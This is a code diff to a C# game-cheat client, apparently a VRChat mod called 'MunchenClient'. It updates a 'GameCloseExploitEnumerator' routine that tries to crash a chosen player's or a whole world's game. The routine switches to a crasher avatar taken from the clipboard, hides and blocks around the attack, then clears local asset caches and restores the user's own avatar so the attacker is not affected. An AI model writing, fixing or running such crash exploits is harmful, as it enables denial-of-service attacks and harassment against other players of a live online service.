@@ -360,7 +360,7 @@ namespace MunchenClient.Utils
 		internal static void ClearVRAM()
 		{
 			
-			//AssetBundleDownloadManager assetBundleDownloadManager = AssetBundleDownloadManager.prop_AssetBundleDownloadManager_0;
+			AssetBundleDownloadManager assetBundleDownloadManager = AssetBundleDownloadManager.prop_AssetBundleDownloadManager_0;
 			System.Collections.Generic.List<string> list = new System.Collections.Generic.List<string>();
 			PlayerManager playerManager = PlayerManager.prop_PlayerManager_0;
 			Player[] P = playerManager.field_Private_List_1_Player_0.ToArray();
@@ -371,27 +371,27 @@ namespace MunchenClient.Utils
 					list.Add(P[i].prop_ApiAvatar_0.assetUrl);
 				}
 			}
-			//System.Collections.Generic.Dictionary<string, AssetBundleDownload> dictionary = new System.Collections.Generic.Dictionary<string, AssetBundleDownload>(); //AssetBundleDownload missing from map
-			//Il2CppSystem.Collections.Generic.Dictionary<string, AssetBundleDownload>.KeyCollection.Enumerator enumerator = assetBundleDownloadManager.field_Private_Dictionary_2_String_AssetBundleDownload_0.Keys.GetEnumerator(); //field_Private_Dictionary_2_String_AssetBundleDownload_0 missing from assetBundleDownloadManager
-			//while (enumerator.MoveNext())
-			//{
-			//	string current = enumerator.Current;
-			//	dictionary.Add(current, assetBundleDownloadManager.field_Private_Dictionary_2_String_AssetBundleDownload_0[current]); // field_Private_Dictionary_2_String_AssetBundleDownload_0 missing from assetBundleDownloadManager
-			//}
-			//foreach (string key in dictionary.Keys)
-			//{
-			//	AssetBundleDownload assetBundleDownload = assetBundleDownloadManager.field_Private_Dictionary_2_String_AssetBundleDownload_0[key]; // field_Private_Dictionary_2_String_AssetBundleDownload_0 missing from assetBundleDownloadManager
-			//	if (!assetBundleDownload.field_Private_String_0.Contains("wrld_") && !list.Contains(key))
-			//	{
-			//		if (assetBundleDownload.prop_GameObject_0 != null)
-			//		{
-			//			UnityEngine.Object.DestroyImmediate(assetBundleDownload.prop_GameObject_0, allowDestroyingAssets: true);
-			//		}
-			//		assetBundleDownload.field_Private_AssetBundle_0?.Unload(unloadAllLoadedObjects: true);
-			//		assetBundleDownloadManager.field_Private_Dictionary_2_String_AssetBundleDownload_0.Remove(key); // field_Private_Dictionary_2_String_AssetBundleDownload_0 missing from assetBundleDownloadManager
-			//	}
-			//}
-			//dictionary.Clear();
+			System.Collections.Generic.Dictionary<string, ObjectPublicInStInCoBoUnInStObBoUnique> dictionary = new System.Collections.Generic.Dictionary<string, ObjectPublicInStInCoBoUnInStObBoUnique>(); //AssetBundleDownload missing from map
+			Il2CppSystem.Collections.Generic.Dictionary<string, ObjectPublicInStInCoBoUnInStObBoUnique>.KeyCollection.Enumerator enumerator = assetBundleDownloadManager.field_Private_Dictionary_2_String_ObjectPublicInStInCoBoUnInStObBoUnique_0.Keys.GetEnumerator(); //field_Private_Dictionary_2_String_AssetBundleDownload_0 missing from assetBundleDownloadManager
+			while (enumerator.MoveNext())
+			{
+				string current = enumerator.Current;
+				dictionary.Add(current, assetBundleDownloadManager.field_Private_Dictionary_2_String_ObjectPublicInStInCoBoUnInStObBoUnique_0[current]); // field_Private_Dictionary_2_String_AssetBundleDownload_0 missing from assetBundleDownloadManager
+			}
+			foreach (string key in dictionary.Keys)
+			{
+                ObjectPublicInStInCoBoUnInStObBoUnique assetBundleDownload = assetBundleDownloadManager.field_Private_Dictionary_2_String_ObjectPublicInStInCoBoUnInStObBoUnique_0[key]; // field_Private_Dictionary_2_String_AssetBundleDownload_0 missing from assetBundleDownloadManager
+				if (!assetBundleDownload.field_Private_String_0.Contains("wrld_") && !list.Contains(key))
+				{
+					if (assetBundleDownload.prop_GameObject_0 != null)
+					{
+						UnityEngine.Object.DestroyImmediate(assetBundleDownload.prop_GameObject_0, allowDestroyingAssets: true);
+					}
+					assetBundleDownload.field_Private_AssetBundle_0?.Unload(unloadAllLoadedObjects: true);
+					assetBundleDownloadManager.field_Private_Dictionary_2_String_ObjectPublicInStInCoBoUnInStObBoUnique_0.Remove(key); // field_Private_Dictionary_2_String_AssetBundleDownload_0 missing from assetBundleDownloadManager
+				}
+			}
+			dictionary.Clear();
 			list.Clear();
 			Resources.UnloadUnusedAssets();
 			Il2CppSystem.GC.Collect(0, Il2CppSystem.GCCollectionMode.Forced, blocking: true, compacting: true);
@@ -451,15 +451,23 @@ namespace MunchenClient.Utils
 				GeneralWrappers.ClosePopup();
 			}
 		}
-
+        public static void ClearAssets()
+        {
+            AssetBundleDownloadManager.field_Private_Static_AssetBundleDownloadManager_0.field_Private_Cache_0.ClearCache();
+            AssetBundleDownloadManager.field_Private_Static_AssetBundleDownloadManager_0.field_Private_Queue_1_ObjectPublicInStInCoBoUnInStObBoUnique_0.Clear();//field_Private_Queue_1_AssetBundleDownload_0
+			AssetBundleDownloadManager.field_Private_Static_AssetBundleDownloadManager_0.field_Private_Queue_1_ObjectPublicInStInCoBoUnInStObBoUnique_1.Clear();
+        }
+		public static string Aaaa { get; set; }
 		public static IEnumerator GameCloseExploitEnumerator(bool quest, APIUser user)
 		{
-			ConsoleUtils.Info("Crasher", "Trying to crash " + ((user != null) ? user.displayName : "world"), System.ConsoleColor.Gray, "GameCloseExploitEnumerator", 502);
+            ConsoleUtils.Info("Crasher", "Trying to crash " + ((user != null) ? user.displayName : "world"), System.ConsoleColor.Gray, "GameCloseExploitEnumerator", 502);
 			//string backupId = PlayerWrappers.GetLocalPlayerInformation().vrcPlayer.prop_VRCAvatarManager_0.prop_ApiAvatar_2.id;
-            string backupId = VRCAvatarManager.field_Internal_Static_String_0;	
+            string backupId = VRCAvatarManager.field_Internal_Static_String_0;
+            Aaaa = Player.prop_Player_0.field_Private_APIUser_0._avatarId_k__BackingField;
             MelonLogger.Msg("Saved backup ID : " + backupId);
-			ChangeHideSelfState(state: true);
+            ChangeHideSelfState(state: true);
 			System.Collections.Generic.List<PlayerInformation> playersToUnblockAfterExploit = new System.Collections.Generic.List<PlayerInformation>();
+			#region Target Crash Stuff
 			if (user != null)
 			{
 				for (int i = 0; i < PlayerUtils.playerCachingList.Count; i++)
@@ -481,34 +489,37 @@ namespace MunchenClient.Utils
 					}
 				}
 				yield return new WaitForSeconds(5f);
-			}
+			} 
+			#endregion
 			//string crasherPC = (string.IsNullOrEmpty(Configuration.GetGeneralConfig().CrasherPC) ? MiscUtils.GetCrashingAvatarPC() : Configuration.GetGeneralConfig().CrasherPC);
 			string crasherClipboard = Clipboard.GetText();
 			//string crasherQuest = (string.IsNullOrEmpty(Configuration.GetGeneralConfig().CrasherQuest) ? MiscUtils.GetCrashingAvatarQuest() : Configuration.GetGeneralConfig().CrasherQuest);
 			//PlayerUtils.ChangePlayerAvatar(quest ? crasherQuest : crasherPC, logErrorOnHud: false);
 			PlayerUtils.ChangePlayerAvatar(crasherClipboard, logErrorOnHud: false);
 			yield return new WaitForSeconds(15f);
-			PlayerUtils.ChangePlayerAvatar(backupId, logErrorOnHud: false);
-			yield return new WaitForSeconds(5f);
-			for (int j = 0; j < playersToUnblockAfterExploit.Count; j++)
-			{
-				if (playersToUnblockAfterExploit[j] != null)
-				{
-					try
-					{
-						PlayerUtils.ToggleBlockOnPlayer(playersToUnblockAfterExploit[j].apiUser);
-					}
-					catch (System.Exception ex)
-					{
-						System.Exception e = ex;
-						ConsoleUtils.Exception("Crasher", "Target Crash Unblock", e, "GameCloseExploitEnumerator", 562);
-					}
-				}
-				yield return new WaitForSeconds(0.1f);
-			}
-			ChangeHideSelfState(state: false);
-			gameCloserExploitRunning = false;
-			ConsoleUtils.Info("Crasher", "Done crashing " + ((user != null) ? user.displayName : "world"), System.ConsoleColor.Gray, "GameCloseExploitEnumerator", 573);
+            yield return new WaitForSeconds(5f);
+            ClearAssets();
+            yield return new WaitForSeconds(3f);
+            PlayerUtils.ChangePlayerAvatar(Aaaa, false);
+            ChangeHideSelfState(state: false);
+            gameCloserExploitRunning = false;
+            for (int j = 0; j < playersToUnblockAfterExploit.Count; j++)
+            {
+                if (playersToUnblockAfterExploit[j] != null)
+                {
+                    try
+                    {
+                        PlayerUtils.ToggleBlockOnPlayer(playersToUnblockAfterExploit[j].apiUser);
+                    }
+                    catch (System.Exception ex)
+                    {
+                        System.Exception e = ex;
+                        ConsoleUtils.Exception("Crasher", "Target Crash Unblock", e, "GameCloseExploitEnumerator", 562);
+                    }
+                }
+                yield return new WaitForSeconds(0.1f);
+            }
+            ConsoleUtils.Info("Crasher", "Done crashing " + ((user != null) ? user.displayName : "world"), System.ConsoleColor.Gray, "GameCloseExploitEnumerator", 573);
 		}
 
 		internal static void RemoveAvatarFromCache(string avatarId)
